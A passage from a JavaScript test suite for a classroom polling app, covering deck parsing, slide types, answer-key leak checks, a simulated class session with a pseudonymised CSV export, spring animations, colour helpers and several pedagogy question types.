    const text = serialiseDeck({ title: 'D', background: plain }, [{ type: 'qa', prompt: 'Ask', config: {} }]);
    notOk(/dim:|blur:/.test(text), 'defaults should not be written out');
    eq(parseDeck(text).background, plain);
    eq(parseDeck('# D\ndim: 0.8\nblur: 4\nbackground: dots\n## qa\nAsk').background,
      { kind: 'preset', id: 'dots' });
    // and either order works over a photo
    eq(parseDeck('# D\ndim: 80%\nbackground: https://e.edu/q.jpg\n## qa\nAsk').background.dim, 0.8);
  });
});

// =====================================================================
describe('instructions slide', () => {
  it('is a content slide, not a question', () => {
    ok(isContentSlide('instructions'));
    notOk(isContentSlide('multiple_choice'));
    notOk(isContentSlide('qa'));
  });

  it('refuses every answer, whatever is thrown at it', () => {
    for (const raw of [null, {}, { choices: [0] }, { text: 'hi' }]) {
      notOk(validateResponse('instructions', { steps: ['a'] }, raw).ok);
    }
  });

  it('aggregates to nothing rather than throwing', () => {
    const agg = aggregate('instructions', { steps: ['a'] }, []);
    eq(agg.total, 0);
  });

  it('parses steps from "-" lines and defaults show_join on', () => {
    const deck = parseDeck(`## instructions
Join in before we start
- Point your camera at the QR code.
- Or type %CODE% at the address on screen.`);
    eq(deck.errors, []);
    eq(deck.questions[0].type, 'instructions');
    eq(deck.questions[0].prompt, 'Join in before we start');
    eq(deck.questions[0].config.steps.length, 2);
    eq(deck.questions[0].config.show_join, true);
  });

  it('falls back to the standard steps and a heading when given neither', () => {
    const deck = parseDeck('## instructions');
    eq(deck.errors, []);
    eq(deck.questions[0].prompt, 'How to join');
    eq(deck.questions[0].config.steps, DEFAULT_JOIN_STEPS);
  });

  it('round-trips join: false', () => {
    const parsed = parseDeck(`## intro
Housekeeping
- Phones out.
join: false`);
    eq(parsed.questions[0].config.show_join, false);
    const again = parseDeck(serialiseDeck({ title: 'x' }, parsed.questions));
    eq(again.questions[0].config.show_join, false);
    eq(again.questions[0].config.steps, ['Phones out.']);
  });

  it('substitutes the join code into a step, leaving the deck portable', () => {
    const step = 'Or go to %URL% and type the code %CODE%.';
    eq(fillJoinPlaceholders(step, { code: 'BQ7RTM', url: 'polls.example.edu' }),
      'Or go to polls.example.edu and type the code BQ7RTM.');
    // the stored deck itself is never rewritten
    ok(step.includes('%CODE%'));
  });

  it('needs no placeholder by default — the slide prints the code itself', () => {
    // A deck owns a permanent code, so the join card shows it and the
    // steps do not have to repeat it. Nothing here should render as a
    // literal %CODE% in front of a class.
    for (const step of DEFAULT_JOIN_STEPS) {
      ok(!/%[A-Z]+%/.test(step), `default step still carries a placeholder: ${step}`);
    }
    // and with no code supplied, a custom step degrades to empty rather
    // than projecting the raw token
    eq(fillJoinPlaceholders('Type %CODE% to join.', {}), 'Type  to join.');
  });

  it('leaves an unknown placeholder alone rather than blanking it', () => {
    eq(fillJoinPlaceholders('Room %ROOM%', { code: 'X' }), 'Room %ROOM%');
  });

  it('is skipped when numbering questions for the room', () => {
    const deck = [
      { id: 'a', type: 'instructions', position: 0 },
      { id: 'b', type: 'multiple_choice', position: 1 },
      { id: 'c', type: 'instructions', position: 2 },
      { id: 'd', type: 'quiz', position: 3 },
    ];
    // the first thing anyone answers is "Question 1 of 2", not "2 of 4"
    eq(questionNumber(deck, 'b'), { number: 1, total: 2 });
    eq(questionNumber(deck, 'd'), { number: 2, total: 2 });
    eq(questionNumber(deck, 'a').number, 0, 'a content slide has no number');
  });

  it('reads deck-wide slide settings, defaulting to the old look', () => {
    // absent settings must not restyle a deck somebody already built
    eq(promptScale({}), 1);
    eq(promptScale({ settings: {} }), 1);
    ok(showSlideLabel({}));
    ok(showSlideLabel({ settings: {} }));
    // and an unknown value falls back rather than collapsing the type
    eq(promptScale({ settings: { promptScale: 'enormous' } }), 1);

    ok(promptScale({ settings: { promptScale: 'compact' } }) < 1);
    ok(promptScale({ settings: { promptScale: 'large' } }) > 1);
    notOk(showSlideLabel({ settings: { showSlideLabel: false } }));
  });

  it('contributes no rows to a CSV export', () => {
    const questions = [
      { id: 'i', type: 'instructions', prompt: 'Join', position: 0, config: {} },
      { id: 'm', type: 'multiple_choice', prompt: 'Pick', position: 1, config: { options: ['A', 'B'] } },
    ];
    const rows = sessionToCSVRows({ label: 'S' }, questions,
      [{ question_id: 'm', round: 1, pseudonym: 'Jade Kestrel', payload: { choices: [0] } }]);
    eq(rows.length, 1);
    eq(rows[0].question_type, 'Multiple choice');
  });
});

// =====================================================================
// A slide type has to be declared in three places: QUESTION_TYPES here,
// the CHECK constraint in worker/schema.sql, and CONTENT_SLIDE_TYPES in
// worker/index.js (which cannot import this file — it is bundled for a
// different runtime). Nothing makes them agree.
//
// They disagreed once. `instructions` was added everywhere except the
// CHECK, so the editor offered a slide type the database refused, the
// insert failed with SQLITE_CONSTRAINT, and — because the click handler
// swallowed the rejection — the button simply looked dead. It cost an
// afternoon. These read the other two files as text, so the next mismatch
// fails here instead of in front of a class.
describe('slide types agree across the three places they are declared', () => {
  const schema = readFileSync(new URL('../worker/schema.sql', import.meta.url), 'utf8');
  const worker = readFileSync(new URL('../worker/index.js', import.meta.url), 'utf8');

  it('the questions CHECK constraint lists exactly QUESTION_TYPES', () => {
    const clause = schema.match(/check\s*\(type in\s*\(([\s\S]*?)\)\)/i);
    ok(clause, 'could not find the type CHECK constraint in worker/schema.sql');
    const inSchema = [...clause[1].matchAll(/'([a-z_]+)'/g)].map((m) => m[1]).sort();
    eq(inSchema, [...QUESTION_TYPES].sort(),
      'worker/schema.sql CHECK and QUESTION_TYPES have drifted — a type in one '
      + 'but not the other is a slide the editor offers and the database rejects');
  });

  it('the Worker\'s content-slide list matches CONTENT_TYPES', () => {
    const decl = worker.match(/CONTENT_SLIDE_TYPES\s*=\s*\[([^\]]*)\]/);
    ok(decl, 'could not find CONTENT_SLIDE_TYPES in worker/index.js');
    const inWorker = [...decl[1].matchAll(/'([a-z_]+)'/g)].map((m) => m[1]).sort();
    eq(inWorker, [...CONTENT_TYPES].sort(),
      'worker/index.js and CONTENT_TYPES have drifted — question numbering on '
      + 'the phone would count content slides, or skip real questions');
  });

  it('every content type is also a known question type', () => {
    for (const t of CONTENT_TYPES) {
      ok(QUESTION_TYPES.includes(t), `${t} is a content type but not in QUESTION_TYPES`);
    }
  });
});

// =====================================================================
describe('answer-key safety', () => {
  it('never carries a correct answer inside the option labels', () => {
    // get_live_question() strips config.correct server-side; this checks
    // the client helper we use to render options does not leak it either.
    const cfg = { options: [{ label: 'A' }, { label: 'B', correct: true }], correct: [1] };
    eq(optionLabels(cfg), ['A', 'B']);
    ok(!JSON.stringify(optionLabels(cfg)).includes('correct'));
  });
});

// =====================================================================
describe('end-to-end participant simulation', () => {
  it('runs a 30-student class through a deck and produces a clean export', () => {
    const deck = parseDeck(SAMPLE_DECK);
    eq(deck.errors, []);

    const questions = deck.questions.map((q, i) => ({ ...q, id: `q${i}`, position: i }));
    const students = Array.from({ length: 30 }, (_, i) => `Student ${i}`); // stand-in devices
    const pseudonyms = students.map((_, i) => `Pseudo ${i}`);
    const responses = [];
    let rejected = 0;

    for (const q of questions) {
      if (q.type === 'qa' || isContentSlide(q.type)) continue;

      pseudonyms.forEach((pseudonym, i) => {
        const raw = fakeAnswer(q, i);
        const check = validateResponse(q.type, q.config, raw);
        if (!check.ok) { rejected += 1; return; }
        responses.push({
          question_id: q.id, round: 1, pseudonym,
          payload: check.payload, created_at: `t${responses.length}`,
        });
      });
    }

    const askable = questions.filter((q) => q.type !== 'qa' && !isContentSlide(q.type));
    eq(rejected, 0, 'every simulated answer should validate');
    eq(responses.length, 30 * askable.length);

    // every question aggregates without throwing and counts everyone
    for (const q of askable) {
      const rows = responses.filter((r) => r.question_id === q.id);
      const agg = aggregate(q.type, q.config, rows);
      eq(agg.total, 30, `${q.type} should count 30 respondents`);
    }

    // the CSV holds one row per response and nothing identifying
    const rows = sessionToCSVRows({ label: 'Sim' }, questions, responses);
    eq(rows.length, responses.length);
    const blob = JSON.stringify(rows);
    ok(!/Student \d/.test(blob), 'no device/student label may reach the export');
    ok(/Pseudo \d/.test(blob), 'only the session pseudonym identifies a row');

    const csv = buildCSV(rows, CSV_HEADERS);
    eq(csv.split('\r\n').length, rows.length + 1);
  });

  it('rejects every answer once voting is closed (mirrors the RLS rule)', () => {
    // The database enforces this; here we assert the UI-side guard agrees
    // that a closed question yields no accepted payloads.
    const q = { type: 'multiple_choice', config: { options: ['A', 'B'] } };
    const accepting = false;
    const submitted = [0, 1, 1].filter(() => accepting);
    eq(submitted.length, 0);
  });
});

function fakeAnswer(q, i) {
  const cfg = q.config;
  switch (q.type) {
    case 'multiple_choice':
      return { choices: [i % cfg.options.length] };
    case 'quiz':
      return { choice: i % cfg.options.length, ms: (i * 137) % 20000 };
    case 'word_cloud':
      return { words: [['curious', 'tired', 'ready', 'nervous'][i % 4]] };
    case 'open_ended':
      return { text: `Response number ${i}` };
    case 'scales':
      return { values: cfg.statements.map((_, s) => cfg.min + ((i + s) % (cfg.max - cfg.min + 1))) };
    case 'ranking':
      return { order: cfg.items.map((_, k) => (k + i) % cfg.items.length) };
    default:
      return {};
  }
}

// =====================================================================
describe('spring physics', () => {
  /** Run a spring to rest, returning every intermediate value. */
  const run = (spring, target, maxFrames = 600) => {
    spring.to(target);
    const path = [];
    for (let i = 0; i < maxFrames && !spring.settled; i += 1) {
      spring.step(1 / 60);
      path.push(spring.value);
    }
    return path;
  };

  const zeta = (p) => p.damping / (2 * Math.sqrt(p.stiffness * (p.mass || 1)));

  it('matches react-spring\'s default preset (what Mentimeter ships)', () => {
    eq(PRESETS.smooth.stiffness, 170);
    eq(PRESETS.smooth.damping, 26);
  });

  it('has a critically damped preset for quantitative values', () => {
    // ζ >= ~0.99 means no meaningful overshoot: a bar never draws a
    // number higher than the one it is animating to.
    ok(zeta(PRESETS.smooth) > 0.98, `smooth ζ=${zeta(PRESETS.smooth).toFixed(3)}`);
    ok(zeta(PRESETS.precise) >= 1.0, `precise ζ=${zeta(PRESETS.precise).toFixed(3)}`);
  });

  it('does not overshoot on the quantitative presets', () => {
    for (const name of ['smooth', 'precise', 'snappy', 'gentle']) {
      const s = new Spring(0, PRESETS[name]);
      const path = run(s, 100);
      const peak = Math.max(...path);
      ok(peak <= 100.5, `${name} overshot to ${peak.toFixed(2)} (must stay <= 100.5)`);
    }
  });

  it('DOES overshoot on the bouncy preset (position/entrance only)', () => {
    const s = new Spring(0, PRESETS.bouncy);
    const path = run(s, 100);
    ok(Math.max(...path) > 101, 'bouncy should visibly overshoot');
    ok(zeta(PRESETS.bouncy) < 0.7, 'bouncy must be clearly underdamped');
  });

  it('settles at exactly the target', () => {
    const s = new Spring(0, PRESETS.smooth);
    run(s, 42.5);
    ok(s.settled);
    eq(s.value, 42.5);
    eq(s.velocity, 0);
  });

  it('looks settled quickly for a full-scale move', () => {
    // What matters is when motion becomes imperceptible, not when the
    // integrator formally rests — the last 1% of a spring's travel is
    // invisible. Worst case here is a 0→100 jump; real vote-to-vote
    // changes are far smaller and land proportionally sooner, because
    // precision scales with distance.
    for (const name of ['smooth', 'precise', 'snappy']) {
      const s = new Spring(0, PRESETS[name]);
      s.to(100);
      let frames = 0;
      let visuallyDone = null;
      while (!s.settled && frames < 600) {
        s.step(1 / 60);
        frames += 1;
        if (visuallyDone === null && Math.abs(s.value - 100) <= 1) visuallyDone = frames;
      }
      ok(visuallyDone !== null && visuallyDone <= 36,
        `${name} took ${visuallyDone} frames (~${(visuallyDone / 60).toFixed(2)}s) to look settled`);
      ok(frames <= 60, `${name} full settle took ${frames} frames`);
    }
  });

  it('moves monotonically toward the target when critically damped', () => {
    const s = new Spring(0, PRESETS.smooth);
    const path = run(s, 100);
    for (let i = 1; i < path.length; i += 1) {
      ok(path[i] >= path[i - 1] - 1e-9, `went backwards at frame ${i}`);
    }
  });

  it('keeps its velocity when retargeted mid-flight', () => {
    // This is the whole point: a vote landing while the bar is moving
    // must bend its path, not restart it from a standstill.
    const s = new Spring(0, PRESETS.smooth);
    s.to(100);
    for (let i = 0; i < 6; i += 1) s.step(1 / 60);
    const vMid = s.velocity;
    ok(vMid > 0, 'should be moving');
    s.to(120);
    eq(s.velocity, vMid, 'retargeting must not zero the velocity');
    notOk(s.settled);
  });

  it('is stable when a frame is dropped (clamps dt)', () => {
    const s = new Spring(0, PRESETS.snappy);
    s.to(100);
    s.step(2.5);                    // a 2.5 second "frame" — tab was hidden
    ok(Number.isFinite(s.value), 'value must not blow up to NaN/Infinity');
    ok(s.value <= 101, `value exploded to ${s.value}`);
  });

  it('snaps instantly without animating', () => {
    const s = new Spring(10, PRESETS.smooth);
    s.to(90);
    s.snap(55);
    ok(s.settled);
    eq(s.value, 55);
    eq(s.velocity, 0);
  });

  it('treats a no-op retarget as already settled', () => {
    const s = new Spring(7, PRESETS.smooth);
    s.to(7);
    ok(s.settled);
  });
});

describe('spring group', () => {
  /** Drive a group by hand, the way the rAF ticker would. */
  const drive = (group, frames = 300) => {
    let painted = 0;
    for (let i = 0; i < frames; i += 1) {
      const moving = group.stepAll(1 / 60);
      painted += 1;
      if (!moving) break;
    }
    return painted;
  };

  it('animates every key to its target', () => {
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.set('a', 100, { from: 0 });
    g.set('b', 50, { from: 0 });
    drive(g);
    close(g.get('a'), 100, 1e-6);
    close(g.get('b'), 50, 1e-6);
    ok(g.settled);
  });

  it('reports not-settled while work is outstanding', () => {
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.set('a', 100, { from: 0 });
    notOk(g.settled);
    g.stepAll(1 / 60);
    notOk(g.settled, 'one frame is not enough to finish');
  });

  it('finishes even when the render callback throws', () => {
    // Regression: a throwing paint used to kill the animation loop, and
    // the chart would sit frozen part-way with no visible error.
    const original = console.error;
    console.error = () => {};
    try {
      const g = new SpringGroup(() => { throw new Error('boom'); }, PRESETS.smooth);
      g.set('a', 100, { from: 0 });
      drive(g);
      close(g.get('a'), 100, 1e-6, 'must still reach the target');
      ok(g.settled);
    } finally {
      console.error = original;
    }
  });

  it('keeps animating after being re-kicked mid-flight', () => {
    // Regression: kick() used to early-return on a stale "already
    // subscribed" flag. If the ticker had dropped the group, it could
    // never restart and the chart froze with springs still under load.
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.set('in', 1, { from: 0 });
    for (let i = 0; i < 3; i += 1) g.stepAll(1 / 60);
    const mid = g.get('in');
    ok(mid > 0 && mid < 0.5, `expected mid-flight, got ${mid}`);

    g.kick();
    g.kick();
    drive(g);
    close(g.get('in'), 1, 1e-6, 'entrance must complete, not stall part-way');
  });

  it('retargets a live key without restarting it', () => {
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.set('w', 1, { from: 0 });
    for (let i = 0; i < 5; i += 1) g.stepAll(1 / 60);
    const before = g.get('w');
    g.set('w', 0.5);                 // a vote lands mid-animation
    g.stepAll(1 / 60);
    ok(Math.abs(g.get('w') - before) < 0.2, 'must bend, not jump');
    drive(g);
    close(g.get('w'), 0.5, 1e-6);
  });

  it('prunes keys for rows that no longer exist', () => {
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.set('a', 1); g.set('b', 2); g.set('c', 3);
    g.prune(new Set(['a', 'c']));
    ok(g.has('a')); notOk(g.has('b')); ok(g.has('c'));
  });

  it('snaps rather than animating when reduced motion is on', () => {
    const g = new SpringGroup(() => {}, PRESETS.smooth);
    g.reduced = true;
    g.set('a', 100, { from: 0 });
    eq(g.get('a'), 100, 'must arrive immediately');
    ok(g.settled);
  });
});

describe('motion helpers', () => {
  it('caps the entrance stagger so long lists still appear promptly', () => {
    eq(stagger(0), 0);
    close(stagger(4), 0.18, 1e-9);
    eq(stagger(100), 0.3, 'must clamp to the 300ms ceiling');
  });

  it('has easing curves anchored at 0 and 1', () => {
    eq(easeOutExpo(0), 0); eq(easeOutExpo(1), 1);
    eq(easeOutCubic(0), 0); eq(easeOutCubic(1), 1);
    ok(easeOutExpo(0.5) > 0.5, 'ease-out should be past halfway at t=0.5');
  });
});

describe('colour', () => {
  it('parses hex and rgb forms', () => {
    eq(toRGB('#ffffff'), [255, 255, 255]);
    eq(toRGB('#000'), [0, 0, 0]);
    eq(toRGB('#1d4ed8'), [29, 78, 216]);
    eq(toRGB('rgb(10, 20, 30)'), [10, 20, 30]);
    eq(toRGB('rgba(10, 20, 30, .5)'), [10, 20, 30]);
    eq(toRGB('nonsense'), [0, 0, 0]);
  });

  it('builds rgba strings and mixes', () => {
    eq(rgba('#000000', 0.5), 'rgba(0, 0, 0, 0.5)');
    eq(mixColor('#000000', '#ffffff', 0.5), 'rgb(128, 128, 128)');
    eq(mixColor('#000000', '#ffffff', 0), 'rgb(0, 0, 0)');
  });

  it('computes luminance and picks a readable foreground', () => {
    close(luminance('#ffffff'), 1, 1e-6);
    close(luminance('#000000'), 0, 1e-6);
    eq(readableOn('#ffffff'), '#0b1220', 'dark text on light');
    eq(readableOn('#000000'), '#ffffff', 'light text on dark');
  });

  it('round-trips sRGB through OKLab', () => {
    for (const hex of ['#1d4ed8', '#b45309', '#15803d', '#ffffff', '#000000']) {
      const back = toRGB(oklabToSrgb(srgbToOklab(hex)));
      const want = toRGB(hex);
      back.forEach((v, i) => close(v, want[i], 2, `${hex} channel ${i}`));
    }
  });

  it('generates a categorical series of the requested length', () => {
    const p = harmonicSeries('#1d4ed8', '#b45309', 5);
    eq(p.length, 5);
    p.forEach((c) => ok(/^rgb\(\d+, \d+, \d+\)$/.test(c), `bad colour: ${c}`));
    eq(harmonicSeries('#1d4ed8', '#b45309', 1), ['#1d4ed8']);
  });

  it('keeps categorical swatches close in perceptual lightness', () => {
    // The reason not to walk hue in HSL: swatches end up with wildly
    // different perceived brightness and the loud ones read as "more".
    const p = harmonicSeries('#1d4ed8', '#b45309', 6);
    const Ls = p.map((c) => srgbToOklab(c)[0]);
    const spread = Math.max(...Ls) - Math.min(...Ls);
    ok(spread < 0.22, `lightness spread ${spread.toFixed(3)} is too wide`);
  });
});

// =====================================================================
// Pedagogy features (roadmap): riders, new types, curation, identity
// =====================================================================

describe('answer riders — confidence and volunteer', () => {
  const cfg = { options: ['A', 'B', 'C'] };

  it('carries a 1–3 confidence self-report on a choice', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [1], conf: 3 });
    ok(r.ok);
    eq(r.payload.conf, 3);
  });

  it('drops out-of-range confidence silently', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [1], conf: 7 });
    ok(r.ok);
    eq(r.payload.conf, undefined);
  });

  it('carries the volunteer hand-raise only when literally true', () => {
    const a = validateResponse('open_ended', {}, { text: 'hi', volunteer: true });
    const b = validateResponse('open_ended', {}, { text: 'hi', volunteer: 'yes' });
    ok(a.ok && b.ok);
    eq(a.payload.volunteer, true);
    eq(b.payload.volunteer, undefined);
  });

  it('aggregates the confidence quadrant against the answer key', () => {
    const qcfg = { options: ['A', 'B'], correct: [0] };
    const rows = [
      { payload: { choice: 0, conf: 3 } },  // sure + right
      { payload: { choice: 1, conf: 3 } },  // sure + wrong (the signal)
      { payload: { choice: 0, conf: 1 } },  // guessing + right
      { payload: { choice: 1, conf: 2 } },  // fairly sure + wrong
      { payload: { choice: 0 } },           // no confidence reported
    ];
    const agg = aggregate('quiz', qcfg, rows);
    eq(agg.confidence.n, 4);
    eq(agg.confidence.quad.sureRight, 1);
    eq(agg.confidence.quad.sureWrong, 1);
    eq(agg.confidence.quad.unsureRight, 1);
    eq(agg.confidence.quad.unsureWrong, 1);
  });

  it('reports null confidence when nobody offered one', () => {
    const agg = aggregate('quiz', { options: ['A'], correct: [0] },
      [{ payload: { choice: 0 } }]);
    eq(agg.confidence, null);
  });
});

describe('opinion spectrum', () => {
  it('clamps and rounds the position', () => {
    eq(validateResponse('spectrum', {}, { pos: 61.4 }).payload.pos, 61);
    eq(validateResponse('spectrum', {}, { pos: 400 }).payload.pos, 100);
    eq(validateResponse('spectrum', {}, { pos: -3 }).payload.pos, 0);
    notOk(validateResponse('spectrum', {}, {}).ok);
  });

  it('aggregates individual points with pseudonyms for dot identity', () => {
    const rows = [
      { pseudonym: 'Amber Falcon', payload: { pos: 10 } },
      { pseudonym: 'Teal Harbor', payload: { pos: 90 } },
    ];
    const agg = aggregate('spectrum', {}, rows);
    eq(agg.total, 2);
    eq(agg.points[0].pos, 10);
    eq(agg.points[0].pseudonym, 'Amber Falcon');
    eq(agg.corners.join(','), '1,0,0,1');
  });
});

describe('writing showdown (sample_vote)', () => {
  const cfg = { samples: ['Thesis A', 'Thesis B'], allow_rationale: true };

  it('validates the pick and trims the rationale', () => {
    const r = validateResponse('sample_vote', cfg,
      { choice: 1, rationale: '  commits to  an argument  ' });
    ok(r.ok);
    eq(r.payload.choice, 1);
    eq(r.payload.rationale, 'commits to an argument');
    notOk(validateResponse('sample_vote', cfg, { choice: 5 }).ok);
  });

  it('aggregates counts and keeps rationales attached to their sample', () => {
    const rows = [
      { payload: { choice: 0 } },
      { payload: { choice: 1, rationale: 'stronger claim' } },
      { payload: { choice: 1 } },
    ];
    const agg = aggregate('sample_vote', cfg, rows);
    eq(agg.total, 3);
    eq(agg.samples[1].count, 2);
    close(agg.samples[1].pct, 66.67, 0.1);
    eq(agg.rationales.length, 1);
    eq(agg.rationales[0].choice, 1);
  });
});

describe('passage heatmap', () => {
  it('splits sentences conservatively and honours manual | splits', () => {
    eq(splitPassage('One. Two! Three?').length, 3);
    eq(splitPassage('All animals are equal | but some animals | are more equal').length, 3);
    eq(splitPassage('Ends without punctuation').length, 1);
    eq(splitPassage('').length, 0);
  });

  const cfg = { segments: ['S1.', 'S2.', 'S3.'], max_picks: 2 };

  it('validates highlight picks within bounds', () => {
    const r = validateResponse('heatmap', cfg, { picks: [2, 0, 2] });
    ok(r.ok);
    eq(r.payload.picks.join(','), '0,2');
    notOk(validateResponse('heatmap', cfg, { picks: [9] }).ok);
    notOk(validateResponse('heatmap', cfg, { picks: [0, 1, 2] }).ok);
  });

  it('validates classify tags against segments and labels', () => {
    const ccfg = { ...cfg, mode: 'classify', labels: ['claim', 'evidence'] };
    const r = validateResponse('heatmap', ccfg, { tags: { 1: 0, 9: 1, 2: 5 } });
    ok(r.ok);
    eq(JSON.stringify(r.payload.tags), '{"1":0}');
  });

  it('aggregates heat normalised to the hottest segment', () => {
    const rows = [
      { payload: { picks: [1] } },
      { payload: { picks: [1] } },
      { payload: { picks: [0] } },
    ];
    const agg = aggregate('heatmap', cfg, rows);
    eq(agg.total, 3);
    eq(agg.segments[1].count, 2);
    eq(agg.segments[1].heat, 1);
    close(agg.segments[0].heat, 0.5, 0.001);
    eq(agg.mode, 'highlight');
  });

  it('aggregates per-label tag counts in classify mode', () => {
    const ccfg = { ...cfg, mode: 'classify', labels: ['claim', 'warrant'] };
    const rows = [
      { payload: { tags: { 0: 0, 1: 1 } } },
      { payload: { tags: { 0: 0 } } },
      { payload: { tags: { 0: 1 } } },
    ];
    const agg = aggregate('heatmap', ccfg, rows);
    eq(agg.mode, 'classify');
    eq(agg.segments[0].tags.join(','), '2,1');
    eq(agg.segments[1].tags.join(','), '0,1');
  });
});

describe('word cloud curation — merge and hide, visibly counted', () => {
  const rows = [
    { payload: { words: ['arguing'] } },
    { payload: { words: ['argue'] } },
    { payload: { words: ['argument'] } },
    { payload: { words: ['rude'] } },
  ];

  it('folds merged variants into one word and counts the merge', () => {
    const cfg = { word_merges: { arguing: 'argue', argument: 'argue' } };
    const agg = aggregate('word_cloud', cfg, rows);
    const argue = agg.words.find((w) => w.word === 'argue');
    eq(argue.count, 3);
    eq(agg.merged, 2);
    eq(agg.words.some((w) => w.word === 'arguing'), false);
  });

  it('hides words without pretending they never happened', () => {
    const agg = aggregate('word_cloud', { word_hidden: ['rude'] }, rows);
    eq(agg.hidden, 1);
    eq(agg.words.some((w) => w.word === 'rude'), false);
    eq(agg.total, 4); // respondent count is untouched by curation
  });

  it('a merge that lands on a hidden word stays hidden and counted', () => {
    const cfg = { word_merges: { arguing: 'rude' }, word_hidden: ['rude'] };
    const agg = aggregate('word_cloud', cfg, rows);
    eq(agg.hidden, 2);
  });
});

describe('question identity across sessions (promptKey)', () => {
  it('normalises case, punctuation and spacing', () => {
    eq(promptKey('  What is a warrant?  '), promptKey('what IS a warrant'));
    ok(promptKey('What is a warrant?') !== promptKey('What is a claim?'));
    eq(promptKey(''), '');
  });
});

describe('new types round-trip the plain-text deck format', () => {
  const src = `# Deck
## spectrum
Uniforms are a justifiable rule
left: Strongly disagree
right: Strongly agree

## showdown
Which thesis is strongest?
- Social media harms attention spans.
- Social media reshapes attention rather than destroying it.
rationale: false

## heatmap
Tap the claim
> All animals are equal. | But some are more equal. | That is the joke.
labels: claim, evidence
max_picks: 2
`;

  it('parses all three with their configs', () => {
    const deck = parseDeck(src);
    eq(deck.errors.length, 0);
    eq(deck.questions.length, 3);
    const [sp, sv, hm] = deck.questions;
    eq(sp.type, 'spectrum');
    eq(sp.config.left_label, 'Strongly disagree');
    eq(sv.type, 'sample_vote');
    eq(sv.config.samples.length, 2);
    eq(sv.config.allow_rationale, false);
    eq(hm.type, 'heatmap');
    eq(hm.config.segments.length, 3);
    eq(hm.config.mode, 'classify');
    eq(hm.config.labels.join(','), 'claim,evidence');
    eq(hm.config.max_picks, 2);
  });

  it('serialise → parse round-trips segmentation and settings', () => {
    const deck = parseDeck(src);
    const again = parseDeck(serialiseDeck({ title: 'Deck', theme: 'lecture-hall' }, deck.questions));
    eq(again.errors.length, 0);
    const [sp, sv, hm] = again.questions;
    eq(sp.config.right_label, 'Strongly agree');
    eq(sv.config.allow_rationale, false);
    eq(hm.config.segments.join('|'), deck.questions[2].config.segments.join('|'));
    eq(hm.config.mode, 'classify');
  });
});

describe('new types stay FERPA-clean in the CSV', () => {
  it('renders readable answer cells for every new type', () => {
    eq(payloadToText('spectrum', { left_label: 'No', right_label: 'Yes' }, { pos: 62 }),
      '62 (0=No, 100=Yes)');
    eq(payloadToText('sample_vote', {}, { choice: 1, rationale: 'tighter' }),
      'Sample 2 — tighter');
    eq(payloadToText('heatmap', { labels: ['claim'] }, { tags: { 0: 0 } }), 'S1=claim');
    eq(payloadToText('heatmap', {}, { picks: [0, 2] }), 'S1 | S3');
  });
});

// =====================================================================
// Second-wave slide types
// =====================================================================

describe('traffic light and mood check', () => {
  it('accepts only a real light, and names it in the CSV', () => {
    const cfg = defaultConfig('traffic');
    ok(validateResponse('traffic', cfg, { choice: 2 }).ok);
    notOk(validateResponse('traffic', cfg, { choice: 3 }).ok);
    notOk(validateResponse('traffic', cfg, {}).ok);
    eq(payloadToText('traffic', cfg, { choice: 1 }), 'Losing the thread');
  });

  it('falls back to the default wording per slot, not wholesale', () => {
    const agg = aggregate('traffic', { labels: ['All good', '', ''] },
      [{ payload: { choice: 0 } }, { payload: { choice: 0 } }, { payload: { choice: 2 } }]);
    eq(agg.options[0].label, 'All good');
    eq(agg.options[1].label, 'Losing the thread');   // the untouched slot
    eq(agg.total, 3);
    eq(Math.round(agg.options[0].pct), 67);
  });

  it('mood carries the emoji through to the chart and the label to the CSV', () => {
    const cfg = { icons: [{ emoji: '☀️', label: 'Clear' }, { emoji: '🌧️', label: 'Rough' }] };
    const agg = aggregate('mood', cfg, [{ payload: { choice: 1 } }]);
    eq(agg.options[1].emoji, '🌧️');
    eq(agg.options[1].count, 1);
    eq(payloadToText('mood', cfg, { choice: 1 }), 'Rough');
  });
});

describe('this or that', () => {
  const cfg = { pairs: [{ left: 'Cats', right: 'Dogs' }, { left: 'Tea', right: 'Coffee' }] };

  it('demands a side on every pair unless skipping is allowed', () => {
    notOk(validateResponse('this_or_that', cfg, { picks: [0] }).ok);
    ok(validateResponse('this_or_that', { ...cfg, allow_skip: true }, { picks: [0] }).ok);
    notOk(validateResponse('this_or_that', cfg, { picks: [] }).ok);
    eq(validateResponse('this_or_that', cfg, { picks: [0, 1] }).payload.picks.join(','), '0,1');
  });

  it('counts each rope separately and sits at 50 with nothing in', () => {
    const agg = aggregate('this_or_that', cfg, [
      { payload: { picks: [0, 1] } },
      { payload: { picks: [0, null] } },
    ]);
    eq(agg.total, 2);
    eq(agg.pairs[0].leftCount, 2);
    eq(agg.pairs[0].leftPct, 100);
    eq(agg.pairs[1].count, 1);
    const empty = aggregate('this_or_that', cfg, []);
    eq(empty.pairs[0].leftPct, 50);
  });
});

describe('budget split', () => {
  const cfg = { options: ['Labs', 'Readings', 'Review'], total: 100 };

  it('insists the pot is spent exactly, and says by how much', () => {
    ok(validateResponse('budget', cfg, { alloc: [50, 30, 20] }).ok);
    notOk(validateResponse('budget', cfg, { alloc: [0, 0, 0] }).ok);
    ok(validateResponse('budget', cfg, { alloc: [50, 30, 10] }).error.includes('10 still'));
    ok(validateResponse('budget', cfg, { alloc: [90, 30, 0] }).error.includes('20 back'));
  });

  it('reports the room’s share and keeps every individual allocation', () => {
    const agg = aggregate('budget', cfg, [
      { payload: { alloc: [100, 0, 0] } },
      { payload: { alloc: [0, 50, 50] } },
    ]);
    eq(agg.total, 2);
    eq(agg.options[0].points, 100);
    eq(agg.options[0].share, 50);
    // the spread is the point: an average of 50 was one 100 and one 0
    eq(agg.options[0].values.join(','), '100,0');
    eq(agg.options[0].zeros, 1);
  });
});

describe('probability slider', () => {
  it('clamps to a whole percentage', () => {
    eq(validateResponse('probability', {}, { pct: 73.6 }).payload.pct, 74);
    eq(validateResponse('probability', {}, { pct: 120 }).payload.pct, 100);
    notOk(validateResponse('probability', {}, {}).ok);
    eq(payloadToText('probability', {}, { pct: 30 }), '30%');
  });

  it('bins the room and reports a median, not a mean', () => {
    const rows = [0, 60, 65, 70, 100].map((pct) => ({ payload: { pct } }));
    const agg = aggregate('probability', { truth: 70 }, rows);
    eq(agg.total, 5);
